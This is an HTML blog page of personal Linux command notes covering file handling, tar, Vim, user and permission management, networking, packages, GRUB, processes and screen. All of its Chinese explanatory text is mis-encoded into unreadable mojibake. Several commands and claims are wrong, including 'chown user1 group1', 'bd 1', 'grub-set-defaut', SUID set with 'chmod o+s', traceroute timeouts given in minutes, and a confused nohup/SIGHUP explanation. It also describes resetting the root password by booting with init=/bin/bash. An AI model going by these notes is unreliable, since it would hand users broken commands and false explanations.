<h2 id="æ–‡ä»¶ç›¸å…³å‘½ä»¤"><a href="#æ–‡ä»¶ç›¸å…³å‘½ä»¤" class="headerlink" title="æ–‡ä»¶ç›¸å…³å‘½ä»¤"></a>æ–‡ä»¶ç›¸å…³å‘½ä»¤</h2><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p><img src="/2021/03/21/linux100%E8%AE%B2/1.png" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -lh			&#x2F;&#x2F;ä»¥Mä¸ºå•ä½æ˜¾ç¤ºæ–‡ä»¶å¤§å°</span><br></pre></td></tr></table></figure>







<h3 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd -			&#x2F;&#x2F;å›åˆ°ä¹‹å‰ç›®å½•</span><br></pre></td></tr></table></figure>



<h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p a&#x2F;b&#x2F;c&#x2F;c&#x2F;d			&#x2F;&#x2F;åˆ›å»ºæ–°çš„ç›®å½•ä¸‹çš„ç›®å½•</span><br></pre></td></tr></table></figure>



<h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -r			&#x2F;&#x2F;é€’å½’åˆ é™¤</span><br></pre></td></tr></table></figure>



<h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -a	f1 f2	&#x2F;&#x2F;ä¿ç•™æƒé™å’Œæ—¶é—´</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r	&#x2F;&#x2F;å¤åˆ¶ç›®å½•</span><br></pre></td></tr></table></figure>



<h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv a -t b			&#x2F;&#x2F;æŠŠç›®å½•aç§»åŠ¨åˆ°ç›®å½•b</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼š<code>mv -t a b</code>ä¼šç§»åŠ¨å</p>
<h3 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wc -w filename			&#x2F;&#x2F;æŸ¥çœ‹æ–‡ä»¶æœ‰å…³ä¿¡æ¯ï¼ˆwordæ•°ï¼‰</span><br></pre></td></tr></table></figure>







<h2 id="è§£å‹ç¼©"><a href="#è§£å‹ç¼©" class="headerlink" title="è§£å‹ç¼©"></a>è§£å‹ç¼©</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar zcf etc-backup.tar.gz &#x2F;etc			&#x2F;&#x2F;ä»¥gzipå½¢å¼å‹ç¼©ã€å‹ç¼©å¿«ï¼Œä½†å‹ç¼©èƒ½åŠ›ç¨å¼±ã€‘</span><br><span class="line">tar jcf etc-backup.tar.bz2 &#x2F;etc		&#x2F;&#x2F;ä»¥bzip2å½¢å¼å‹ç¼©ã€å‹ç¼©æ…¢ï¼Œä½†å‹ç¼©èƒ½åŠ›å¼ºã€‘</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar zxf etc-backup.tar.gz -C &#x2F;root		&#x2F;&#x2F;ä»¥gzipå½¢å¼è§£å‹å¹¶è¾“å‡ºåˆ°&#x2F;rootç›®å½•</span><br><span class="line">tar jxf etc-backup.tar.bz2 -C &#x2F;root		&#x2F;&#x2F;ä»¥bzip2å½¢å¼è§£å‹å¹¶è¾“å‡ºåˆ°&#x2F;rootç›®å½•</span><br></pre></td></tr></table></figure>

<blockquote>
<p>.tar.gzæœ‰æ—¶ç¼©å†™ä¸º.tgz</p>
</blockquote>
<h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><h3 id="æ­£å¸¸æ¨¡å¼"><a href="#æ­£å¸¸æ¨¡å¼" class="headerlink" title="æ­£å¸¸æ¨¡å¼"></a>æ­£å¸¸æ¨¡å¼</h3><h4 id="ç§»åŠ¨"><a href="#ç§»åŠ¨" class="headerlink" title="ç§»åŠ¨"></a>ç§»åŠ¨</h4><p>ä¸Šã€kã€‘ä¸‹ã€jã€‘å·¦ã€hã€‘å³ã€lã€‘</p>
<p><code>:set nu</code>   æ˜¾ç¤ºè¡Œå·</p>
<p>nç„¶åshift+gï¼šç§»åŠ¨åˆ°nè¡Œ</p>
<p>gï¼šç§»åŠ¨åˆ°ç¬¬ä¸€è¡Œ</p>
<p>shift+gï¼šç§»åŠ¨åˆ°æœ€åä¸€è¡Œ</p>
<p>^:ç§»åŠ¨åˆ°è¡Œé¦–</p>
<p>$:ç§»åŠ¨åˆ°è¡Œæœ«</p>
<h4 id="å¤åˆ¶ç²˜è´´"><a href="#å¤åˆ¶ç²˜è´´" class="headerlink" title="å¤åˆ¶ç²˜è´´"></a>å¤åˆ¶ç²˜è´´</h4><p>yï¼šå¤åˆ¶</p>
<p>yyï¼šå¤åˆ¶æ•´è¡Œ</p>
<p>nyyï¼šå¤åˆ¶ä»å½“å‰è¡Œå¼€å§‹çš„nè¡Œ</p>
<p>y$ï¼šä»å½“å‰ä½ç½®å¤åˆ¶åˆ°è¡Œå°¾</p>
<p>ddï¼šå‰ªåˆ‡</p>
<p>d$ï¼šä»å½“å‰ä½ç½®å‰ªåˆ‡åˆ°è¡Œå°¾</p>
<h4 id="æ’¤é”€"><a href="#æ’¤é”€" class="headerlink" title="æ’¤é”€"></a>æ’¤é”€</h4><p>æ’¤é”€ï¼šu</p>
<p>å–æ¶ˆæ’¤é”€ï¼šCtrl + r</p>
<h3 id="æ’å…¥æ¨¡å¼"><a href="#æ’å…¥æ¨¡å¼" class="headerlink" title="æ’å…¥æ¨¡å¼"></a>æ’å…¥æ¨¡å¼</h3><p>è¿›å…¥ï¼š</p>
<p>iï¼šæ­£å¸¸è¿›å…¥</p>
<p>Iï¼šè¿›å…¥æœ¬è¡Œå¼€å¤´</p>
<p>aï¼šè¿›å…¥åä¸€å­—ç¬¦</p>
<p>Aï¼šè¿›å…¥è¯¥è¡Œç»“å°¾</p>
<p>oï¼šåœ¨è¯¥è¡Œä¸‹å¦èµ·ä¸€è¡Œ</p>
<p>Oï¼šè¿›æ”¹è¡Œä¸Šå¦èµ·ä¸€è¡Œ</p>
<h3 id="æœ«è¡Œæ¨¡å¼"><a href="#æœ«è¡Œæ¨¡å¼" class="headerlink" title="æœ«è¡Œæ¨¡å¼"></a>æœ«è¡Œæ¨¡å¼</h3><p><code>:w filename</code>    ä¿å­˜æ–‡ä»¶ä¸ºfilename</p>
<p>:! + ç³»ç»Ÿå‘½ä»¤    vimç¼–è¾‘æ—¶æƒ³æŸ¥çœ‹ç³»ç»Ÿå‘½ä»¤</p>
<h4 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h4><p>/abc    æŸ¥æ‰¾æ–‡æ¡£ä¸­çš„abcã€ä¹‹åæŒ‰å›è½¦ä¹‹åï¼šnè·³åˆ°åä¸€ä¸ªå­—ç¬¦ï¼›Nè·³åˆ°å‰ä¸€ä¸ªå­—ç¬¦ã€‘</p>
<h4 id="æ›¿æ¢"><a href="#æ›¿æ¢" class="headerlink" title="æ›¿æ¢"></a>æ›¿æ¢</h4><p>:s/a/b    åœ¨è¯¥è¡ŒæŠŠç¬¬ä¸€ä¸ªaæ›¿æ¢ä¸ºb</p>
<p>:s/a/b/g    åœ¨è¯¥è¡ŒæŠŠæ‰€æœ‰aæ›¿æ¢ä¸ºb</p>
<p>:%s/a/b    åœ¨æ¯ä¸€è¡Œé‡ŒæŠŠç¬¬ä¸€ä¸ªaæ›¿æ¢ä¸ºb</p>
<p>:%s/a/b/g    å°†æ–‡æ¡£é‡Œæ‰€æœ‰aæ›¿æ¢ä¸ºb</p>
<p>:3,5s/a/b    åœ¨ç¬¬3è¡Œåˆ°ç¬¬5è¡Œä¹‹é—´å°†aæ›¿æ¢ä¸ºb</p>
<p><code>:set nu</code>   æ˜¾ç¤ºè¡Œå·</p>
<p><code>:set nonu</code>ä¸æ˜¾ç¤ºè¡Œå·</p>
<h3 id="å¯è§†æ¨¡å¼"><a href="#å¯è§†æ¨¡å¼" class="headerlink" title="å¯è§†æ¨¡å¼"></a>å¯è§†æ¨¡å¼</h3><p>vï¼šå¯è§†</p>
<p>Ctrl + vï¼šå¯è§†å—</p>
<p>shift + vï¼šå¯è§†è¡Œ</p>
<blockquote>
<p>åœ¨æŒ‡å®šè¡Œæ·»åŠ #ï¼š</p>
<ol>
<li>shift+vè¿›å…¥å¯è§†è¡Œæ¨¡å¼ï¼Œé€‰ä¸­éœ€è¦æ·»åŠ æ³¨é‡Šçš„è¡Œ</li>
<li>ç§»åŠ¨åˆ°è¡Œé¦–ï¼ŒCtrl+qè¿›å…¥åˆ—æ¨¡å¼</li>
<li>shift+iè¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œå¹¶æ·»åŠ #</li>
<li>ESCé€€å‡ºå³å¯å®Œæˆ</li>
</ol>
</blockquote>
<h2 id="ç”¨æˆ·ç®¡ç†"><a href="#ç”¨æˆ·ç®¡ç†" class="headerlink" title="ç”¨æˆ·ç®¡ç†"></a>ç”¨æˆ·ç®¡ç†</h2><p><img src="/2021/03/21/linux100%E8%AE%B2/2.png" alt="2"></p>
<p><img src="/2021/03/21/linux100%E8%AE%B2/3.png" alt="3"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod&#x2F;useradd -g group1 user1</span><br></pre></td></tr></table></figure>







<h2 id="su-sudo"><a href="#su-sudo" class="headerlink" title="su/sudo"></a>su/sudo</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - username</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤</span><br><span class="line">sudo &#x2F;sbin&#x2F;shutdown -c</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ€ä¹ˆçŸ¥é“<code>shutdown -c</code>åœ¨sbinç›®å½•ä¸‹ï¼Ÿ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">which shutdown -c			&#x2F;&#x2F;which:locate a command</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">visudo		è®¾ç½®ä½¿ç”¨sudoçš„ç”¨æˆ·</span><br></pre></td></tr></table></figure>





<h2 id="æ–‡ä»¶æƒé™"><a href="#æ–‡ä»¶æƒé™" class="headerlink" title="æ–‡ä»¶æƒé™"></a>æ–‡ä»¶æƒé™</h2><p><img src="/2021/03/21/linux100%E8%AE%B2/4.png" alt="4"></p>
<blockquote>
<p>æƒé™ï¼š</p>
<p>r-4ï¼Œw-2ï¼Œx-1</p>
<p>å±ä¸»ï¼Œå±ç»„ï¼Œå…¶ä»–äºº</p>
</blockquote>
<p><img src="/2021/03/21/linux100%E8%AE%B2/5.png" alt="5"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chown user1 æ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">chown user1 group1 æ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">chgrp group1 æ–‡ä»¶æˆ–ç›®å½•</span><br></pre></td></tr></table></figure>



<h3 id="ç‰¹æ®Šæƒé™"><a href="#ç‰¹æ®Šæƒé™" class="headerlink" title="ç‰¹æ®Šæƒé™"></a>ç‰¹æ®Šæƒé™</h3><p><img src="/2021/03/21/linux100%E8%AE%B2/6.png" alt="6"></p>
<p>SUIDï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod o+s &#x2F;tmpæˆ–</span><br><span class="line">chmod 4777 &#x2F;tmp</span><br></pre></td></tr></table></figure>

<p>SGID</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod g+s &#x2F;tmpæˆ–</span><br><span class="line">chmod 2777 &#x2F;tmp</span><br></pre></td></tr></table></figure>

<p>SBIT</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod o+t &#x2F;tmpæˆ–è€…</span><br><span class="line">chmod 1777 &#x2F;tmp</span><br></pre></td></tr></table></figure>





<blockquote>
<p> SUIDï¼šç½®äº u çš„ x ä½ï¼ŒåŸä½ç½®æœ‰æ‰§è¡Œæƒé™ï¼Œå°±ç½®ä¸º sï¼Œæ²¡æœ‰äº†ä¸º S .<br> SGIDï¼šç½®äº g çš„ x ä½ï¼ŒåŸä½ç½®æœ‰æ‰§è¡Œæƒé™ï¼Œå°±ç½®ä¸º sï¼Œæ²¡æœ‰äº†ä¸º S .<br> STICKYï¼šç²˜æ»ä½ï¼Œç½®äº o çš„ x ä½ï¼ŒåŸä½ç½®æœ‰æ‰§è¡Œæƒé™ï¼Œå°±ç½®ä¸º t ï¼Œå¦åˆ™ä¸ºT .</p>
</blockquote>
<h3 id="ç»™æŒ‡å®šç”¨æˆ·èµ‹äºˆæŒ‡å®šæƒé™"><a href="#ç»™æŒ‡å®šç”¨æˆ·èµ‹äºˆæŒ‡å®šæƒé™" class="headerlink" title="ç»™æŒ‡å®šç”¨æˆ·èµ‹äºˆæŒ‡å®šæƒé™"></a>ç»™æŒ‡å®šç”¨æˆ·èµ‹äºˆæŒ‡å®šæƒé™</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getfacl file		&#x2F;&#x2F;æŸ¥çœ‹æ–‡ä»¶æƒé™</span><br><span class="line">setfacl -m u:user1:rw file		&#x2F;&#x2F;ç»™user1ç”¨æˆ·å¢åŠ å¯¹fileæ–‡ä»¶çš„rwæƒé™</span><br><span class="line">setfacl -x g:group1:w file		&#x2F;&#x2F;ç»™group1ç»„å‡å°‘å¯¹fileæ–‡ä»¶çš„wæƒé™</span><br></pre></td></tr></table></figure>







<h2 id="ç½‘ç»œ"><a href="#ç½‘ç»œ" class="headerlink" title="ç½‘ç»œ"></a>ç½‘ç»œ</h2><p><img src="/2021/03/21/linux100%E8%AE%B2/7.png" alt="7"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mii-tool etho			&#x2F;&#x2F;æŸ¥çœ‹ç½‘å¡ç‰©ç†è¿æ¥çŠ¶æ€</span><br><span class="line">route -n				&#x2F;&#x2F;æŸ¥çœ‹ç½‘å…³</span><br></pre></td></tr></table></figure>



<h3 id="ä¿®æ”¹é…ç½®"><a href="#ä¿®æ”¹é…ç½®" class="headerlink" title="ä¿®æ”¹é…ç½®"></a>ä¿®æ”¹é…ç½®</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0[æ¥å£] 192.168.33.123[ä¿®æ”¹çš„ipåœ°å€] netmask 255.255.255.0[è®¾ç½®çš„å­ç½‘æ©ç ]</span><br><span class="line">ifup eth0			&#x2F;&#x2F;æ‰“å¼€æ¥å£</span><br><span class="line">ifdown eth0</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">route add&#x2F;del default[destination] gw 192.168.33.1[é…ç½®çš„ç½‘å…³]</span><br><span class="line">route add -host 10.0.0.1 gw 10.211.55.1			&#x2F;&#x2F;è®¿é—®10.0.0.1æ—¶é€šè¿‡ç½‘å…³10.211.55.1</span><br><span class="line">route add -net 192.168.0.0 netmask 255.255.255.0 gw 10.211.55.2			&#x2F;&#x2F;è®¾ç½®ç½‘æ®µçš„æ˜ç»†è·¯ç”±</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/21/linux100%E8%AE%B2/8.png" alt="8"></p>
<h3 id="æ•…éšœæ’é™¤"><a href="#æ•…éšœæ’é™¤" class="headerlink" title="æ•…éšœæ’é™¤"></a>æ•…éšœæ’é™¤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ping des</span><br><span class="line">traceroute -w 1 des		&#x2F;&#x2F;æœ€å¤šç­‰1åˆ†é’Ÿ</span><br><span class="line">mtr			&#x2F;&#x2F;è¯¦ç»†ä¸€ç‚¹çš„traceroute</span><br><span class="line">nslookup åŸŸå			&#x2F;&#x2F;åŸŸåè½¬æ¢ä¸ºipåœ°å€</span><br><span class="line">telnet åŸŸå 80[ç«¯å£å·]		&#x2F;&#x2F;æŸ¥çœ‹ä¸åŸŸåå¯¹åº”çš„ç«¯å£å·èƒ½å¦é€šä¿¡</span><br><span class="line">tcpdump	-i any[ç½‘å¡] -n[è§£ææˆip] host 10.0.0.1 and port 80 -w &#x2F;0ath[ä¿å­˜çš„è·¯å¾„]</span><br><span class="line">netstat -ntpl</span><br><span class="line">ss -ntpl</span><br></pre></td></tr></table></figure>





<h3 id="ç½‘ç»œç®¡ç†"><a href="#ç½‘ç»œç®¡ç†" class="headerlink" title="ç½‘ç»œç®¡ç†"></a>ç½‘ç»œç®¡ç†</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service networking restart&#x2F;stop&#x2F;status</span><br><span class="line">vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä¸»æœºåï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hostnamectl	set-hostname	AGsite</span><br><span class="line"></span><br><span class="line">vim &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure>


</blockquote>
<h2 id="è½¯ä»¶åŒ…"><a href="#è½¯ä»¶åŒ…" class="headerlink" title="è½¯ä»¶åŒ…"></a>è½¯ä»¶åŒ…</h2><h3 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h3><h4 id="rpm"><a href="#rpm" class="headerlink" title="rpm"></a>rpm</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rpm	-q			&#x2F;&#x2F;æŸ¥è¯¢è½¯ä»¶åŒ…</span><br><span class="line">rpm	-i			&#x2F;&#x2F;å®‰è£…è½¯ä»¶åŒ…</span><br><span class="line">rpm -e			&#x2F;&#x2F;å¸è½½è½¯ä»¶åŒ…</span><br></pre></td></tr></table></figure>



<h4 id="æºä»£ç ç¼–è¯‘å®‰è£…"><a href="#æºä»£ç ç¼–è¯‘å®‰è£…" class="headerlink" title="æºä»£ç ç¼–è¯‘å®‰è£…"></a>æºä»£ç ç¼–è¯‘å®‰è£…</h4><p><img src="/2021/03/21/linux100%E8%AE%B2/9.png" alt="9"></p>
<p>æœ‰æ—¶ä¼šéœ€è¦å®‰è£…ä¾èµ–åŒ…ï¼Œå³</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install openssl-devel			&#x2F;&#x2F;-develè¡¨ç¤ºä¾èµ–åŒ…</span><br></pre></td></tr></table></figure>



<h4 id="yum"><a href="#yum" class="headerlink" title="yum"></a>yum</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install</span><br></pre></td></tr></table></figure>



<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname	-r			&#x2F;&#x2F;æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬</span><br><span class="line">lscpu				&#x2F;&#x2F;æŸ¥çœ‹CPU</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install</span><br></pre></td></tr></table></figure>





<h2 id="grubæ–‡ä»¶"><a href="#grubæ–‡ä»¶" class="headerlink" title="grubæ–‡ä»¶"></a>grubæ–‡ä»¶</h2><h3 id="å†…æ ¸å¼•å¯¼"><a href="#å†…æ ¸å¼•å¯¼" class="headerlink" title="å†…æ ¸å¼•å¯¼"></a>å†…æ ¸å¼•å¯¼</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;default&#x2F;grub</span><br><span class="line">grep ^menu &#x2F;boot&#x2F;grub&#x2F;grub.cfg			&#x2F;&#x2F;æŸ¥çœ‹æœ‰å“ªäº›å†…æ ¸ç‰ˆæœ¬</span><br><span class="line">grub-editenv list						&#x2F;&#x2F;æŸ¥çœ‹å½“å‰é»˜è®¤å†…æ ¸å¯åŠ¨ç‰ˆæœ¬</span><br><span class="line">grub-set-defaut 0						&#x2F;&#x2F;è®¾ç½®é»˜è®¤å†…æ ¸ä¸ºä¹‹å‰ã€grepã€‘çš„ç¬¬ä¸€ä¸ª</span><br></pre></td></tr></table></figure>



<h3 id="ä¿®æ”¹rootå¯†ç "><a href="#ä¿®æ”¹rootå¯†ç " class="headerlink" title="ä¿®æ”¹rootå¯†ç "></a>ä¿®æ”¹rootå¯†ç </h3><p>åœ¨é€‰æ‹©å†…æ ¸ç•Œé¢é€‰æ‹©éœ€è¦çš„å†…æ ¸å¹¶ç‚¹å‡»eã€‚</p>
<ol>
<li>kaliï¼šåœ¨quietåé¢åŠ <code>init=/bin/bash</code></li>
<li>centosï¼šåœ¨quietåé¢åŠ singleã€centosä¹‹åå¥½åƒå°±è¦åŠ åˆ«çš„ä¸œè¥¿äº†ã€‘</li>
</ol>
<h2 id="è¿›ç¨‹ç®¡ç†"><a href="#è¿›ç¨‹ç®¡ç†" class="headerlink" title="è¿›ç¨‹ç®¡ç†"></a>è¿›ç¨‹ç®¡ç†</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps	-ef</span><br><span class="line">ps	-eLf	&#x2F;&#x2F;å¯æŸ¥çœ‹çº¿ç¨‹ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">pstree</span><br><span class="line">top</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nice -n 10 .&#x2F;a.shã€éœ€è¦å…ˆåœæ­¢a.shã€‘	&#x2F;&#x2F;è°ƒèŠ‚è¿›ç¨‹ä¼˜å…ˆçº§ã€-20~19,æ•°å­—è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ã€‘</span><br><span class="line">renice -n 10 1920ã€è¿›ç¨‹å·ã€‘	ã€ä¸éœ€è¦åœæ­¢è¿›ç¨‹ã€‘</span><br></pre></td></tr></table></figure>



<h3 id="è¿›ç¨‹çš„å‰åå°"><a href="#è¿›ç¨‹çš„å‰åå°" class="headerlink" title="è¿›ç¨‹çš„å‰åå°"></a>è¿›ç¨‹çš„å‰åå°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;a.sh &amp;		&#x2F;&#x2F;è¿›ç¨‹åå°è¿è¡Œ</span><br><span class="line"></span><br><span class="line">jobs			&#x2F;&#x2F;æŸ¥çœ‹è¿è¡Œä¸­çš„ç¨‹åº</span><br><span class="line">Ctrl+z			&#x2F;&#x2F;å°†å‰å°è¿è¡Œçš„æ–‡ä»¶æ”¾å…¥åå°å¹¶æŒ‚èµ·</span><br><span class="line">fg 1			&#x2F;&#x2F;å°†åå°ç¨‹åºè°ƒåˆ°å‰å°ã€1æ˜¯jobsæ˜¾ç¤ºçš„ä½œä¸šå·ã€‘</span><br><span class="line">bd 1</span><br></pre></td></tr></table></figure>



<h3 id="æ€æ­»è¿›ç¨‹"><a href="#æ€æ­»è¿›ç¨‹" class="headerlink" title="æ€æ­»è¿›ç¨‹"></a>æ€æ­»è¿›ç¨‹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 PID</span><br></pre></td></tr></table></figure>







<h3 id="nuhupå’Œ-amp"><a href="#nuhupå’Œ-amp" class="headerlink" title="nuhupå’Œ&amp;"></a>nuhupå’Œ&amp;</h3><blockquote>
<p>SIGINTï¼šï¼ˆsignal interruptï¼‰ä¸€èˆ¬Ctrl+cå¼•èµ·</p>
<p>SIGHUPï¼šï¼ˆsignal hang upï¼‰ä¸€èˆ¬å…³æ‰ç»ˆç«¯æ—¶å¼•èµ·</p>
<p>å½“æˆ‘ä»¬è¿è¡Œåå°ç¨‹åº&amp;çš„æ—¶å€™ï¼Œå¦‚æœè¦åœæ­¢éœ€è¦SIGNUPä¿¡å·ï¼Œå³å…³æ‰è¯¥Sessionï¼ˆç»ˆç«¯ï¼‰ã€Ctrl+cæ— æ•ˆã€‘</p>
<p>å½“æˆ‘ä»¬è¿è¡ŒNohupç¨‹åºæ—¶ï¼Œå¦‚æœè¦åœæ­¢éœ€è¦SIGNINTä¿¡å·ï¼Œå³Ctrl+cã€å…³æ‰åç«¯æ— æ•ˆã€‘</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup .&#x2F;a.sh AG</span><br></pre></td></tr></table></figure>





<h3 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">screen -S ag		&#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªæ–°ä¼šè¯</span><br><span class="line">screen -ls			&#x2F;&#x2F;æŸ¥çœ‹å·²ç»åˆ›å»ºçš„ä¼šè¯</span><br><span class="line">Ctrl+a+d			&#x2F;&#x2F;æš‚æ—¶ç¦»å¼€å½“å‰sessionã€å‰å°è¿è¡Œbashæ—¶è¿™æ ·é€€å‡ºï¼Œæ¢å¤ä¹‹åbashä¾ç„¶åœ¨è¿è¡Œã€‘</span><br><span class="line">screen -r ag		&#x2F;&#x2F;æ¢å¤agä¼šè¯</span><br><span class="line">exit				&#x2F;&#x2F;é€€å‡ºå½“å‰ä¼šè¯ã€detachedã€‘</span><br><span class="line"></span><br><span class="line">screen -X -S ag quit			&#x2F;&#x2F;åˆ é™¤ä¼šè¯ag</span><br><span class="line">kill -9 ä¼šè¯ID					&#x2F;&#x2F;åˆ é™¤ä¼šè¯</span><br></pre></td></tr></table></figure>





<h2 id="ç³»ç»Ÿæ—¥å¿—"><a href="#ç³»ç»Ÿæ—¥å¿—" class="headerlink" title="ç³»ç»Ÿæ—¥å¿—"></a>ç³»ç»Ÿæ—¥å¿—</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;log</span><br><span class="line"></span><br><span class="line">tail -f messages		&#x2F;&#x2F;ç³»ç»Ÿæ—¥å¿—</span><br><span class="line">tail -f</span><br></pre></td></tr></table></figure>







